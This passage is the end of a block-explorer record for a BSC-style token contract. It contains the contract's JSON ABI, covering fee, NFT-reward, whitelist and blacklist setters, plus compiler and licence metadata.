ernalType\":\"uint256\",\"name\":\"NFTID\",\"type\":\"uint256\"}],\"name\":\"NFT_Dividend\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"NFTID\",\"type\":\"uint256\"}],\"name\":\"notEnoughToken\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"NFT_reward_percentage\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_Against\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_buyFundFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_buyLPDividendFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_buyLPFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_feeWhiteList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_mainPair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxWalletAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_nftAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_nftDistributor\",\"outputs\":[{\"internalType\":\"contract TokenDistributor\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_nftRewardHoldCondition\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_sellFundFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_sellLPDividendFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_sellLPFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_swapPairList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_swapRouter\",\"outputs\":[{\"internalType\":\"contract ISwapRouter\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_tokenDistributor\",\"outputs\":[{\"internalType\":\"contract TokenDistributor\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_usdt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"addLPBegin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"addLPEnd\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"addLiquidityFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"airDropNumbs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"antiSYNC\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buy_burnFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"status\",\"type\":\"bool\"}],\"name\":\"changeManualAddFeeEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"status\",\"type\":\"bool\"}],\"name\":\"changeManualRemoveFeeEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"currentNFTIndex\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"excludeNFT\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"excludeNFTHolder\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fightB\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAddress_2\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getAddlpFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getRemovelpFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"goAddLPBlock\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_start\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_fb\",\"type\":\"uint256\"}],\"name\":\"launch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lp_reward_gas\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"manualAddFeeEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"manualRemoveFeeEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"addresses\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"value\",\"type\":\"bool\"}],\"name\":\"multiAgainst\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"nftRewardCondition\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"nft_reward_gas\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"processNFTBlock\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"processNFTBlockDebt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"processRewardWaitBlock\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLiquidityFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sell_burnFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newValue\",\"type\":\"uint256\"}],\"name\":\"setAddLiquidityFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"status\",\"type\":\"bool\"}],\"name\":\"setAgainst\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newValue\",\"type\":\"uint256\"}],\"name\":\"setAirdropNumbs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"s\",\"type\":\"bool\"}],\"name\":\"setAntiSYNCEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newBuyBurn\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"newSellBurn\",\"type\":\"uint256\"}],\"name\":\"setBurnFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newFund\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"newLp\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"newLpDividend\",\"type\":\"uint256\"}],\"name\":\"setBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"setClaims\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"enable\",\"type\":\"bool\"}],\"name\":\"setExcludeHolder\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"id\",\"type\":\"uint256\"},{\"internalType\":\"bool\",\"name\":\"enable\",\"type\":\"bool\"}],\"name\":\"setExcludeNFT\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"enable\",\"type\":\"bool\"}],\"name\":\"setExcludeNFTHolder\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"enable\",\"type\":\"bool\"}],\"name\":\"setFeeWhiteList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"setFundAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"setFundAddress_2\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"setHolderRewardCondition\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newValue\",\"type\":\"uint256\"}],\"name\":\"setMaxWalletAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"setNFTAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"setNFTRewardCondition\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"setNFTRewardHoldCondition\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newPercentage\",\"type\":\"uint256\"}],\"name\":\"setNFT_reward_percentage\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"blockDebt\",\"type\":\"uint256\"}],\"name\":\"setProcessNFTBlockDebt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newValue\",\"type\":\"uint256\"}],\"name\":\"setProcessRewardWaitBlock\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newValue\",\"type\":\"uint256\"}],\"name\":\"setRemoveLiquidityFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newValue\",\"type\":\"uint256\"}],\"name\":\"setRemoveLpBurnDuration\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newFund\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"newLp\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"newLpDividend\",\"type\":\"uint256\"}],\"name\":\"setSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newValue\",\"type\":\"uint256\"}],\"name\":\"setSwapAtAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"enable\",\"type\":\"bool\"}],\"name\":\"setSwapPairList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newValue\",\"type\":\"uint256\"}],\"name\":\"setTransferFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"addresses\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"status\",\"type\":\"bool\"}],\"name\":\"setWLs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newValue\",\"type\":\"uint256\"}],\"name\":\"set_lp_reward_gas\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newValue\",\"type\":\"uint256\"}],\"name\":\"set_nft_reward_gas\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"startTime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapAtAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingOpen\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"transferFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "TOKEN", "CompilerVersion": "v0.8.7+commit.e28d00a7", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://e8783402947e93a1266a2ec37ec80a361a8485c196c405bd3bee52120a260d0c"}